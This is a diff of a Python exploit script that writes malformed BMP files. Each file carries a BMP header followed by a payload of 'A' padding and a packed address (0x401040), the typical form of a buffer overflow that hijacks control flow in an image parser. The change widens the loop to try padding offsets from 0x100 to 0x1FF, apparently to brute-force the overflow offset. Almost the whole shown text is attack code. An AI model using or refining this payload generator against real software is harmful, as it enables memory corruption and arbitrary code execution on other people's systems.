@@ -13,16 +13,16 @@ bmp_header += struct.pack('<I', file_size)
 bmp_header += b'\x00\x00\x00\x00'           
 bmp_header += struct.pack('<I', 54)         
 bmp_header += struct.pack('<I', 40)        
-bmp_header += struct.pack('<I', width)     
-bmp_header += struct.pack('<I', height)    
+bmp_header += struct.pack('<I', width)      
+bmp_header += struct.pack('<I', height)     
 bmp_header += struct.pack('<H', 1)         
 bmp_header += struct.pack('<H', bpp)       
 bmp_header += b'\x00\x00\x00\x00'          
-bmp_header += struct.pack('<I', pixel_data_size)  
-bmp_header += b'\x00\x00\x00\x00' * 4       
+bmp_header += struct.pack('<I', pixel_data_size) 
+bmp_header += b'\x00\x00\x00\x00' * 4    
 
-for i in range(0, 64): 
-    offset = 0x140 + i
+for i in range(0x100, 0x200): 
+    offset = i
     payload = (
         b'A' * offset +
         struct.pack('<I', 0x401040) +
@@ -32,4 +32,3 @@ for i in range(0, 64):
     with open(file_name, 'wb') as f:
         f.write(bmp_header)
         f.write(payload)
-
